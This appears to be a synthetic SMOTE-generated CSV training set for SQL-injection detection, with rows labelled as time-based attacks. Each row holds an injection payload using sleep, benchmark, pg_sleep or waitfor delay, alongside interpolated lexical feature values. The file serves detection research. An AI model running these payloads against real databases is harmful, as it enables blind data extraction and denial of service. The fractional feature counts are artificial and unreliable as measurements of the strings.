id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000274,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000049,1.7000259079183053,74.92371026169316,26.07711307850795,3.709713058723423,21.154226157015895,16.230515895322736,27.46185513084658,10.077113078507947,0.28106793066144364,0.21910342871602112,0.3659949288493461,0.13383371177318915,0.0,2.3847420523386322,0.0,0.0,0.0,1.0,0.0,4.692371026169316,0.6923710261693159,0.0,1.0,1.0,0.0,1.0,0.0,0.30762897383068405,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.692371026169316,0.0,0.0,0.0,0.6923710261693159,0.3076289738306841,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.692371026169316
SMOTE_000275,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000006,0.25783199483180996,65.93420406208108,23.93420406208108,3.5497879474082947,19.0,10.0,27.0,9.93420406208108,0.28817019179964093,0.151668521999811,0.40950500939948975,0.1506562768010584,0.9342040620810796,0.06579593791892047,2.0,0.0,0.0,1.0,0.0,4.0,0.9342040620810798,1.0,0.0,3.0,0.9342040620810794,0.06579593791892041,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000276,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.11768027075377616,60.15489371699589,23.0,3.6550566043673824,20.883829712253082,10.0,22.232340575493836,7.038723429248973,0.3473377642391331,0.16626329761198985,0.3694095762384689,0.11698936191040811,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0387234292489733,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.038723429248972985,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0387234292489733
SMOTE_000277,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000036,1.534940344708167,82.4266798736142,26.651667492100888,3.7368310684592507,22.168342413109766,21.0,29.303334984201776,9.955002476302663,0.26510739514515314,0.257108542085559,0.35762201426788665,0.12016204850140122,2.955002476302664,0.0,0.0,0.0,0.0,1.6516674921008878,0.0,4.348332507899112,0.0,0.0,1.0,1.6516674921008878,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.6516674921008879,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.651667492100888
SMOTE_000278,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000043,0.17163564922212696,94.77890205167061,28.0,3.8417435118348124,20.189512527139474,29.715731209290787,33.87365831524035,11.0,0.21320880969435857,0.31335256020723756,0.35735823806112826,0.1160803920372755,1.0947562635697374,0.0,1.936829157620175,0.0,0.0,2.0,0.0,4.968414578810087,0.0,0.0,1.0,3.936829157620175,1.0,0.0,0.9684145788100875,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9684145788100874,0.0,1.0,0.03158542118991248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000279,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,1.7835066165648155,62.87459787522132,24.29153262507377,3.530145743953129,19.70846737492623,10.0,25.874597875221315,7.291532625073772,0.3148456374813559,0.15938827151180882,0.41026339540630735,0.11550269560052795,1.0,0.0,1.2915326250737722,0.0,0.0,1.0,0.0,3.645766312536886,0.0,0.0,0.0,2.291532625073772,1.0,0.0,0.6457663125368861,0.3542336874631139,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6457663125368861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.645766312536886
SMOTE_000280,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.05199458515212657,55.23954974232505,23.0,3.790732158107978,23.03832795877201,4.0,17.172475814474033,11.028745969079006,0.4174087258315873,0.07250950023424996,0.31032132367648774,0.19976045025767497,6.0,0.0,0.0,0.0,0.0,0.990418010306998,0.0,2.038327958772008,0.0,0.0,0.0,0.990418010306998,1.0,0.0,0.0,0.0,0.0,0.990418010306998,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000281,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,0.6917918285140698,74.27977827956026,17.379963046593378,2.865475558747301,25.379963046593378,1.189981523296689,37.32987066307682,10.379963046593378,0.3423219051530616,0.015773626223181444,0.5022616848011511,0.13964278382260592,0.1899815232966886,0.0,0.0,0.0,1.0,0.0,0.0,8.189981523296689,0.0,0.0,0.0,1.0,0.18998152329668877,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.18998152329668863,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.189981523296689
SMOTE_000282,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,1.633409310441515,61.416462311540144,23.566584924616055,3.738390528553282,21.566584924616055,10.566584924616057,21.716707537691974,7.566584924616056,0.3510895863934924,0.17175140316963128,0.3543180208737526,0.1228409895631237,1.2832924623080284,0.0,2.0,0.0,0.0,1.0,0.0,2.7167075376919714,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7167075376919716,0.0,0.2832924623080284,0.2832924623080284,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.283292462308028
SMOTE_000283,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.2191898309857994,85.39501518062715,24.308637743693378,3.261041637711905,33.08637743693378,1.6913622563066202,39.30863774369338,11.308637743693378,0.3856848274861992,0.0201811794723169,0.461566050739365,0.13256794230211885,1.617275487386756,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.691362256306622,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.3086377436933781,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.308637743693378
SMOTE_000284,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.3104697095021547,86.82169236579361,23.5616643303824,3.0640395274769987,30.0,2.0,43.383356696176016,11.4383356696176,0.346885553242354,0.02312570354949027,0.4980840869158775,0.1319046562922782,0.5616643303823987,0.0,0.0,0.0,1.0,0.0,0.0,8.876671339235202,0.0,0.0,0.0,1.0,0.5616643303823985,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,1.2546070592229013,58.18859893610235,23.28684063833859,3.548809292940913,18.0,10.0,23.426318723322822,6.76228021277953,0.30973548928980127,0.17207527182766735,0.40157073871962334,0.11661850016290796,0.0,0.76228021277953,1.52456042555906,0.0,0.0,1.0,0.0,3.2377197872204704,0.0,0.0,0.0,2.5245604255590597,0.0,0.7622802127795298,0.76228021277953,0.23771978722047007,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,1.6926258933289222,76.40306803553027,25.680613607106054,3.755282543095398,19.100767008882567,22.361227214212107,26.52092041065908,8.420153401776513,0.25,0.290926664086121,0.34788585479145906,0.11118748112241991,0.0,1.0,0.0,0.0,0.0,1.4201534017765134,0.0,4.0,0.0,0.0,1.0,1.4201534017765134,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.42015340177651356,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4201534017765134
SMOTE_000287,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,2.7201396622098044,91.59715591835791,22.532385306119306,2.9524849286206396,29.06477061223861,1.5323853061193056,47.59715591835791,13.402844081642085,0.31721732250746154,0.016644865189053712,0.519507151781093,0.14663066052239176,1.4028440816420857,0.0,0.0,0.0,1.0,0.4676146938806952,0.0,9.532385306119306,0.4676146938806952,0.0,0.0,1.467614693880695,0.4676146938806953,0.0,0.0,0.5323853061193047,0.0,0.46761469388069526,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.4676146938806952,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.467614693880695
SMOTE_000288,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.5415107336073507,88.21254830747475,28.0,3.872781825675891,26.0,21.212548307474755,30.0,11.0,0.29474894586384787,0.24045463950469975,0.34009493753520903,0.12470147709624332,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.2125483074747536,0.7874516925252464,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000024,2.344220720149539,78.63373223748349,19.584330593708707,2.9078477915988103,21.53492894993393,2.633732237483483,41.14820493132433,13.316866118741741,0.2733467220485033,0.03335955930268343,0.5239865009926321,0.16930721765618117,4.633732237483484,0.0,0.0,0.0,0.0,0.6831338812582585,0.0,7.366267762516516,0.0,0.0,0.0,0.6831338812582584,1.0,0.0,0.0,0.0,0.0,0.6831338812582584,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6831338812582586,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6831338812582585,0.0,0.3168661187417415,0.3168661187417415,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000290,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.4736629215407546,59.89422127673568,21.099695856670298,3.328998233016845,15.0,10.79756685336239,25.89726271003269,8.199391713340598,0.25225854922726487,0.17853037723413837,0.43208367784673174,0.13712739569186502,0.0,0.0,2.0,0.0,0.0,1.0996958566702988,0.0,4.099695856670299,0.0,0.0,1.0,3.099695856670299,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0996958566702989,0.0,0.9003041433297012,0.09969585667029895,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.099695856670299
SMOTE_000291,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,1.5336442569941338,89.67778242499523,28.419445606248807,3.825166597411557,28.097228031244025,18.483326362507167,32.09722803124403,11.0,0.3128623670577568,0.20692926000194306,0.357487968626435,0.12272040431386519,3.580554393751195,0.0,0.0,0.0,0.0,1.5805543937511948,0.0,4.838891212497611,0.0,0.0,1.0,1.5805543937511946,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.4194456062488053,0.0,0.0,0.0,1.0,0.5805543937511946,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000292,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,0.6597270487020398,92.3185731450969,26.13628537098062,3.7283466211452185,21.72742925803876,27.27257074196124,33.45485851607752,9.86371462901938,0.23529353761063942,0.2956680845655888,0.36222756049143634,0.10681081733233545,0.8637146290193807,0.0,0.27257074196123876,0.0,0.0,2.0,0.0,4.8637146290193805,0.0,0.0,1.0,2.2725707419612386,0.8637146290193805,0.0,0.13628537098061938,0.8637146290193805,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000293,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,2.4944477982799187,94.7104668803506,23.046770417855686,2.9430178539849385,29.046770417855686,1.5233852089278415,49.663696462494904,14.476614791072157,0.3068817356854316,0.015869158465000588,0.5237992373881497,0.1534498684614181,1.9532295821443133,0.0,0.0,0.0,1.0,0.47661479107215665,0.0,10.046770417855686,0.47661479107215665,0.0,0.0,1.4766147910721565,1.0,0.0,0.0,0.5233852089278432,0.0,0.47661479107215665,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.47661479107215665,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.476614791072157
SMOTE_000294,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.4342701350148035,77.42852001429071,23.95797412016895,3.5214278358826623,18.915948240337897,20.277298826891933,30.23527294706088,8.0,0.24323711502206408,0.2621447620575368,0.3902841903539706,0.10433393256642857,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.319324706722983,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.680675293277017,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.3193247067229831,0.0,0.0,0.0,0.3193247067229829,0.680675293277017,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.319324706722983
SMOTE_000295,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000049,0.42743331972128695,77.68732350363791,27.104225498787365,3.735260655618906,22.270421508488454,15.625352992724181,28.895774501212635,10.895774501212637,0.2863734080475945,0.20144746681673803,0.3719552187160831,0.14022390641958438,0.0,2.791549002425273,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.10422549878736354,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8957745012126364,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8957745012126366
SMOTE_000296,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,2.2774462769705703,86.20302322573086,28.171860460818692,3.7517692132596436,27.687441843274776,15.0,32.515581382456084,11.0,0.31953050858188725,0.17516090462848902,0.3768572567287318,0.12845133006089196,1.7577906912280403,1.24220930877196,0.0,0.0,0.0,1.0,0.0,5.585930230409347,0.4140697695906532,0.0,1.0,1.0,0.5859302304093468,0.41406976959065317,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000297,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,0.058628352002912616,62.25117625725146,19.0,3.200059415676885,26.0,1.0,27.251176257251455,8.0,0.41768290253749674,0.016064727020672964,0.4377345542764467,0.1285178161653836,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000298,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,4.887785462637355,61.57209057372734,24.5432543442364,3.7493451363158266,22.028836229490935,10.0,21.485581885254533,8.057672458981866,0.357703240331486,0.16267984487890005,0.3498578756906823,0.12975903909893172,2.0288362294909335,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0288362294909335,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5144181147454667,0.5144181147454667,0.0,1.0,0.0,0.5144181147454667,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0288362294909335
SMOTE_000299,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000038,2.126352524626866,72.53153213295332,20.23900378034745,3.1093708264647173,27.23900378034745,1.6195018901737246,34.434022682084695,9.23900378034745,0.3791340136636904,0.021820658443817392,0.4715308368108435,0.1275144910816487,0.0,1.7609962196525506,0.0,0.0,0.6195018901737247,0.0,0.0,6.858505670521175,0.0,0.0,0.0,0.619501890173725,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.6195018901737246,0.0,0.0,0.6195018901737248,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.23900378034745
SMOTE_000300,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,1.8152485110102385,79.93682923421417,19.0,2.923204776713003,27.0,2.0,40.46051827138386,10.476310962830317,0.3386130342537934,0.02508244698176247,0.5058583768366283,0.13044614192781587,0.4921036542767725,0.0,0.0,0.0,1.0,0.0,0.0,8.492103654276772,0.0,0.0,0.0,1.0,0.49210365427677233,0.0,0.0,0.4921036542767724,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000301,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,0.8550522277544007,62.34674905464031,21.346749054640313,3.273591749664604,18.0,10.0,28.0,6.3467490546403145,0.28874962626423245,0.1604164590356847,0.44916608529991714,0.10166782940016572,0.1733745273201568,0.0,0.34674905464031364,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.3467490546403136,0.1733745273201568,0.0,0.17337452732015682,0.8266254726798432,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000302,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.0589934993649284,82.16427616176925,24.01493419652448,3.184179099015965,30.14934196524478,1.9850658034755213,39.01493419652448,11.014934196524477,0.36681323843390956,0.024186577965047765,0.47493021686414977,0.13406996673689292,1.0298683930489554,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9850658034755221,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.014934196524477694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.014934196524478
SMOTE_000303,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,0.36197403257508104,64.0,22.886904018336644,3.389062677639672,18.0,10.0,28.0,8.0,0.28125,0.15625,0.4375,0.125,0.8869040183366433,0.11309598166335666,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.8869040183366433,0.11309598166335663,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000304,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,1.5645056229472856,77.15577922495291,17.85929653749215,2.8735633929931583,25.85929653749215,1.4296482687460745,39.007537881222525,10.85929653749215,0.33614002481408933,0.018151272507401547,0.5051148603422152,0.14059384233629396,0.42964826874607553,0.0,0.0,0.0,1.0,0.0,0.0,8.429648268746075,0.0,0.0,0.0,1.0,0.42964826874607537,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.4296482687460754,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.429648268746075
